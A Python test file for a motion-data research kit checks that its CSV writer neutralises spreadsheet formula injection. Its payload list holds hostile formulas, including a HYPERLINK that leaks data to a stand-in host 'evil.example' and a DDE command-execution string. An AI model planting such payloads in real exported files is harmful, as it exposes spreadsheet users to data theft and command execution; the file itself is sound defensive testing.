"""Researcher-facing CSVs never carry a live spreadsheet formula (CSV / formula injection).

Record strings (quality.warnings, notes, phone models, ids) reach the CSV tables unchanged and the upload
endpoint is public, so every CSV the kit writes goes through ``report.write_csv``.
"""
from __future__ import annotations

import copy
import csv
import dataclasses
import importlib.util
import re

import numpy as np
import pandas as pd
from _mlhelpers import ANALYSIS_DIR

from motionlab import synth
from motionlab.report import FORMULA_TRIGGERS, csv_safe, escape_formula, write_csv

PAYLOADS = [
    '=HYPERLINK("https://evil.example/?leak","click me")',
    "+cmd|' /C calc'!A0",
    '-2+3',
    '@SUM(1,2)',
    '\t=1+1',
    '\r=1+1',
    '  =1+1',  # leading spaces are skipped by some spreadsheets
]


def _cells(path) -> list[str]:
    with open(path, newline='', encoding='utf-8') as fh:
        return [c for row in csv.reader(fh) for c in row]


def _live_formulas(cells: list[str]) -> list[str]:
    """Cells a spreadsheet would evaluate: a trigger first (after spaces) and not a plain number."""
    out = []
    for c in cells:
        if c.lstrip(' ')[:1] not in FORMULA_TRIGGERS:
            continue
        try:
            float(c)  # '-0.5', '-1e-05': numbers written by pandas are fine
        except ValueError:
            out.append(c)
    return out


def test_escape_formula_quotes_only_dangerous_strings():
    for p in PAYLOADS:
        assert escape_formula(p) == "'" + p
    for v in ('ok', 'low_rate', '', ' ', 'a=b', 'P-ABCDEF', "'=already quoted"):
        assert escape_formula(v) == v
    for v in (-1, -0.5, 3, True, None):
        assert escape_formula(v) is v
    nan = float('nan')
    assert escape_formula(nan) is nan


def test_write_csv_escapes_cells_labels_and_keeps_numbers(tmp_path):
    n = len(PAYLOADS)
    df = pd.DataFrame({
        'text': PAYLOADS,
        'mixed': ['=1+1', 2, None, -3.5, 'fine', '@x', '-'],
        'cat': pd.Categorical(['=evil'] + ['ok'] * (n - 1)),
        'x': np.linspace(-1.0, 1.0, n),
        'k': np.arange(n) - 3,
    }, index=pd.Index([f'-t{i}' for i in range(n)], name='trial_id'))
    df.loc[df.index[1], 'x'] = np.nan
    df['=col'] = 1.0  # a column label taken from the data
    path = write_csv(df, tmp_path / 't.csv')
    cells = _cells(path)
    assert not _live_formulas(cells), _live_formulas(cells)
    for p in PAYLOADS:
        assert "'" + p in cells
    assert "'=col" in cells and "'-t0" in cells and "'=evil" in cells
    back = pd.read_csv(path, index_col=0)
    np.testing.assert_allclose(back['x'].to_numpy(), df['x'].to_numpy())  # numbers untouched (NaN too)
    assert list(back['k']) == list(df['k'])
    assert df['text'].iloc[0] == PAYLOADS[0]  # the caller's frame is not modified
    safe = csv_safe(pd.DataFrame({'a': ['=x']}, index=pd.MultiIndex.from_tuples([('=p', 1)], names=['k', 'v'])))
    assert safe.index[0] == ("'=p", 1) and safe['a'].iloc[0] == "'=x"
    assert csv_safe(pd.DataFrame(columns=['a'])).empty


def _script(name: str):
    spec = importlib.util.spec_from_file_location(f'scripts_{name}_csv', ANALYSIS_DIR / 'scripts' / f'{name}.py')
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_qa_report_tables_neutralise_formulas_from_records(tiny_dataset, tmp_path):
    """A fabricated but schema-valid trial carries formulas in quality.warnings (free text in the schema)."""
    trials = copy.deepcopy(tiny_dataset.trials)
    for t in trials[:3]:
        t['quality']['warnings'] = list(t['quality']['warnings']) + PAYLOADS
    ds = dataclasses.replace(tiny_dataset, trials=trials)
    root = synth.write_folder_tree(ds, tmp_path / 'data')
    out = tmp_path / 'qa'
    assert _script('qa_report').main([str(root), '--out', str(out), '--quiet', '--no-plots', '--no-offline',
                                      '--no-online-check', '--sample', '5']) == 0
    tables = sorted((out / 'tables').glob('*.csv'))
    assert any(p.name == 'quality_warnings.csv' for p in tables)
    for p in tables:
        assert not _live_formulas(_cells(p)), p.name
    warn = _cells(out / 'tables' / 'quality_warnings.csv')
    for p in PAYLOADS:
        assert "'" + p in warn, p


def test_every_csv_the_kit_writes_goes_through_write_csv():
    """No direct DataFrame.to_csv in the package or the scripts (report.write_csv is the only writer)."""
    offenders = []
    for path in sorted([*(ANALYSIS_DIR / 'motionlab').glob('*.py'), *(ANALYSIS_DIR / 'scripts').glob('*.py')]):
        if path.name == 'report.py':
            continue
        for k, line in enumerate(path.read_text(encoding='utf-8').splitlines(), 1):
            if re.search(r'\.to_csv\(|csv\.writer\(', line):
                offenders.append(f'{path.name}:{k}: {line.strip()}')
    assert not offenders, offenders
